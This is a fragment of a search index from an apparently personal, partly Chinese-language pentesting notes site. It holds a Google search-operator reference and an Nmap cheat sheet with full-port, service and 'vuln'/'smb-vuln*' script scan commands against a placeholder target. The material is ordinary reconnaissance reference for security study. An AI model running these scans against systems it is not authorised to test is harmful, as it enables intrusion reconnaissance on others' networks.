Tools","text":"","tags":"","url":"Misc_Tools\/Misc_Pentesting_Tools.html"},{"title":"File Analyze Tools","text":"","tags":"","url":"Misc_Tools\/File_Analyze_Tools.html"},{"title":"Vulnerable Target Machine","text":"","tags":"","url":"Misc_Tools\/Vulnerable_Target_Machine.html"},{"title":"Tools-Metasploit","text":"","tags":"","url":"Misc_Tools\/Tools_Metasploit.html"},{"title":"Tools-Google Hacking","text":"Google Hacking tags: Security Tools Table of Contents Google Hacking tags: Security Tools Alternate query types \u5099\u4efd\u67e5\u8a62\u985e\u578b cache link related info Other define Query modifiers \u67e5\u8a62\u4fee\u98fe\u7b26 site intext intitle inurl Filetype Advanced operators Alternate query types \u5099\u4efd\u67e5\u8a62\u985e\u578b cache cache:www.csie.fju.edu.tw \u67e5\u8a62\u67d0\u7db2\u9801\u5728google\u4e2d\u7684cache link link:www.csie.fju.edu.tw \u67e5\u8a62\u6240\u6709\u548c\u7db2\u9801\u6709\u9023\u7d50\u7684\u7db2\u9801 related related:www.csie.fju.edu.tw \u5217\u51fa\u6240\u6709\u548c\u67e5\u8a62\u7db2\u9801\u985e\u4f3c\u7684\u7db2\u9801 info info:hoschoc.com \u5217\u51fa\u67d0\u7db2\u7ad9\u5728Google\u4e0a\u5b58\u6709\u54ea\u4e9b\u8cc7\u8a0a Other define define:\u8d6b\u863f \u5c0b\u627e\u67d0\u5b57\u8a5e\u5728\u7db2\u8def\u4e0a\u7684\u5b9a\u7fa9 Query modifiers \u67e5\u8a62\u4fee\u98fe\u7b26 site Usage:&quot;\u95dc\u9375\u5b57 site:\u7db2\u5740&quot; \u67e5\u8a62\u6307\u5b9a\u7db2\u7ad9\u5167\u7684\u7db2\u9801 site:tw \u4e5f\u53ef\u4ee5\u6307\u5b9a\u570b\u7c4d intext Intext:\u53f0\u7063 \u53ea\u60f3\u5728\u7db2\u9801\u5167\u6587\u4e2d\u5c0b\u627e\u8cc7\u6599 intitle \u53ea\u60f3\u5728\u7db2\u9801\u6a19\u984c\u4e2d\u5c0b\u627e\u8cc7\u6599 inurl \u5c0b\u627e\u6307\u5b9a\u7684\u5b57\u4e32\u5728\u7db2\u5740\u5217\u7576\u4e2d Filetype filetype:pdf filetype:mp3 Advanced operators Operator Purpose Mixes with Other Operators? Can be used Alone? Web Images Groups News intitle Search page Title yes yes yes yes yes yes allintitle Search page title no yes yes yes yes yes inurl Search URL yes yes yes yes not really like intitle allinurl Search URL no yes yes yes yes like intitle filetype specific files yes no yes yes no not really intext Search text of page only yes yes yes yes yes yes allintext Search text of page only not really yes yes yes yes yes site Search specific site yes yes yes yes no not really link Search for links to pages no yes yes no no not really inanchor Search link anchor text yes yes yes yes not really yes numrange Locate number yes yes yes no no not really daterange Search in date range yes no yes not really not really not really author Group author search yes yes no no yes not really group Group name search not really yes no no yes not really insubject Group subject search yes yes like intitle like intitle yes like intitle msgid Group msgid search no yes not really not really yes not really","tags":"","url":"Misc_Tools\/Tools_Google_Hacking.html"},{"title":"Tools-Nmap","text":"Nmap tags: Security Tools Table of Contents Nmap tags: Security Tools Cheet sheet Initial Scan Vulnerable Scan Others Parameters Output speed Guide Dealing with Misidentified and Unidentified Hosts Updater for Nmap\u2019s architecture-independent files Cheet sheet Initial Scan nmap -p- -vvv -oN nmap.scan_all_port.log {{target}} nmap -A -sC -sV -oN nmap.initial.log {{target}} cat nmap.scan_all_port.log | grep &quot;^[0-9]&quot; | awk -v FS=&quot;\/&quot; '{print $1}' | tr '\\n' ',' | sed s\/,$\/\/ ports=$(nmap -p- --min-rate=1000 -T4 {{target}} | grep &quot;^[0-9]&quot; | cut -d '\/' -f 1 | tr '\\n' ',' | sed s\/,$\/\/) nmap -sC -sV -p $ports {{target}} tip: sleep 300; Vulnerable Scan nmap --script &quot;vuln&quot; -oN nmap.vulnscan.log {{target}} nmap --script=&quot;smb-vuln*&quot; -p 139, 445 -v -oN nmap.vulnscan.smb.log {{target}} Others nmap -p- -sT {{target}} nmap -sT -sV -A -O -p 1-65535 {{target}} Parameters -A Enable OS detection (need sudo), version detection, script scanning, and traceroute Output -oA {{filename}} Output in the three major formats at once -oN {{filename}} Output scan in normal format speed -T paranoid(0)|sneaky(1)|polite(2)|normal(3)|aggressive(4)|insane(5) Set a timing template --min-rate {{number}} --max-rate {{number}} --min-rate 300 means that Nmap will try to keep the sending rate at or above 300 packets per second. -sn # Ping Scan - disable port scan -sT(TCP) | -sU(UDP) | -sY(SCTP INIT) | -sA(TCP ACK) -sN(Null) | -sF(FIN) | -sX(Xmas) --top-ports={{number}} # \u6383\u63cf\u524d {{number}} \u5e38\u7528\u7684 port -sV # enumerate versions -sC --script=default # run safe scripts -Pn # skip host discovery -p {{port}} {{ranges}} # -p 139,445 # -p 1-65535 == -p - # \u7bc4\u570d\u7684\u982d\u5c3e\u5982\u679c\u662f 1\/65535 \u53ef\u7701\u7565 # -p U:53,111,137,T:21-25,80 # T: for TCP, U: for UDP, S: for SCTP, or P: for IP Protocol --open # show only open ports -v | -vv | -vvv verbosity level Guide Dealing with Misidentified and Unidentified Hosts \u5982\u679c\u6c92\u8fa6\u6cd5\u6e96\u78ba\u7684\u5075\u6e2c OS\uff0c\u6709\u5e7e\u500b\u505a\u6cd5\uff1a \u66f4\u65b0\u5230\u6700\u65b0\u7248\u672c \u6383\u63cf\u66f4\u591a port z.B. -p- \u6383\u63cf\u5168\u90e8\u7684 port \u6216 -sU \u52a0\u4e0a UDP Scan \u4f7f\u7528\u66f4\u7a4d\u6975\u7684\u731c\u6e2c \u6709\u4e9b\u6642\u5019\u6703\u56e0\u70ba\u9632\u706b\u7246\u4e4b\u985e\u7684\u554f\u984c\u5f97\u5230\u4e0d\u540c\u7684\u7d50\u679c \u52a0\u4e0a --osscan-guess \u53c3\u6578 \u63db\u500b\u5730\u65b9\u9032\u884c\u5075\u6e2c Updater for Nmap\u2019s architecture-independent files \u56e0\u70ba nselib \u548c nse scripts \u5e38\u5e38\u9700\u8981\u66f4\u65b0\uff0c\u6240\u4ee5\u6211\u73fe\u5728\u7684\u505a\u6cd5\u5c31\u662f\u76f4\u63a5 clone nmap \u7684 GitHub \u4e0b\u4f86\uff0clink nselib \u548c scripts \u5230 \/usr\/share\/nmap (\u628a\u539f\u672c\u7684 mv \u5230 *.old) \u53e6\u5916\u5728 manual \u6709\u770b\u5230\u4e00\u500b\u53eb\u505a nmap-update \u7684\u6771\u897f\u770b\u8d77\u4f86\u662f\u6211\u8981\u7684\uff0c\u4f46\u76ee\u524d (7.80) \u4f3c\u4e4e\u9084\u6c92\u6709\u9019\u500b\u529f\u80fd","tags":"","url":"Misc_Tools\/Tools_Nmap.html"}]});